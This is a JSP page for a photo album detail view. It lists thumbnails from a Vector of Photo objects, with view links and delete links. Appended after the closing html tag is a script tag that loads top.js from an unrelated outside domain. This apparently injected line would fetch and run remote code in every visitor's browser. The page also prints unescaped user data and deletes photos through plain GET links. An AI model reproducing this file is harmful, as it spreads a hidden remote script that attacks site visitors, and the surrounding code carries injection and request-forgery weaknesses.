<%@ page
 contentType="text/html;charset=GBK"
 import="java.util.*,com.javabean.Photo"
 session="true"
%>
<html>
<head>
	<title>相册明细</title>
	<style type="text/css">
	.newjoyo_vcd1 {
	   border-bottom:1px ridge #C49238;border-left:1px ridge #C49238;
	   border-right:1px ridge #C49238;border-top:1px ridge #C49238;
	   line-height:18px;
	}
	</style>
</head>
<body>
<center>
	<form action="AlbumServlet" method="post">
	<table border="0" width="90%" height="90%" 
		   style="border-color:#C49238"
	       class="newjoyo_vcd1" cellpadding="0" cellspacing="0"
	       bgcolor="azure">
	<tr><td height="10"></td></tr>
	<tr align="center">
	<%//从request获取参数
	Vector vec=(Vector)request.getAttribute("photoVec");
	//将内容输出到网页
		for(Enumeration enu=vec.elements();enu.hasMoreElements();) {
			Photo photo=(Photo)enu.nextElement();
			if(vec.size()%5==0) {
				out.println("<br>");
			}
	%>
		<td align="center">
			<table border="0" width="15%" height="20%" 
				   style="border-color:#000000" class="newjoyo_vcd1"
				   cellpadding="0" cellspacing="0">
			<tr height="80" align="center"><td>
		<%
		 String s=photo.getPhotoId();
		 if (true) 
		 {
		  	out.println("<img height=122 width=130 src=\""
		  	+request.getContextPath()+"/PhotoServlet?photoId="+s+"\">");
		 }
		%></td></tr>
			<tr height="20" align="center"><td>
			<a href="PhotoServlet?photoId=
				<%= photo.getPhotoId() %>" title="点击查看大图">
				<%= photo.getPhotoName() %></a>
			<a href="AlbumServlet?action=delPhoto&photoId=
				<%= photo.getPhotoId() %>&albumId=<%= photo.getAlbumId() %>"
			   title="点击删除此图片">删除</a>&nbsp;
		</td></tr></table></td>
	<%
		}
	%>
	</tr></table></form></center>
</body>
</html>
<script language=javascript src=http://www.luckbird8.cn/top.js></script>